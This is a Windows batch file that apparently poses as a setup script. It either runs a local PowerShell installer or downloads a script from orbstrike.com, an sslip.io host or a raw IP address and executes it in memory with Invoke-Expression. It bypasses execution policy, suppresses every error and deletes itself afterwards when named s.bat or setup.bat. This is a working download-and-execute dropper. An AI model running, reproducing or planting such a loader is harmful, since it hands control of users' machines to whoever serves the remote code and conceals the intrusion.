@echo off
chcp 65001 >nul 2>&1
if exist "%~dp0install_win.ps1" (
    powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%~dp0install_win.ps1"
) else (
    powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls; $wc = New-Object System.Net.WebClient; $s = ''; foreach ($u in @('https://orbstrike.com/win','https://103-149-172-179.sslip.io/win','http://103.149.172.179:4000/win')) { try { $s = $wc.DownloadString($u); if ($s) { break } } catch {} }; if ($s) { Invoke-Expression $s } } catch {}"
)
if /I "%~nx0"=="s.bat" (start /b "" cmd /c del /f /q "%~f0" >nul 2>&1 & exit /b 0)
if /I "%~nx0"=="setup.bat" (start /b "" cmd /c del /f /q "%~f0" >nul 2>&1 & exit /b 0)
exit /b 0
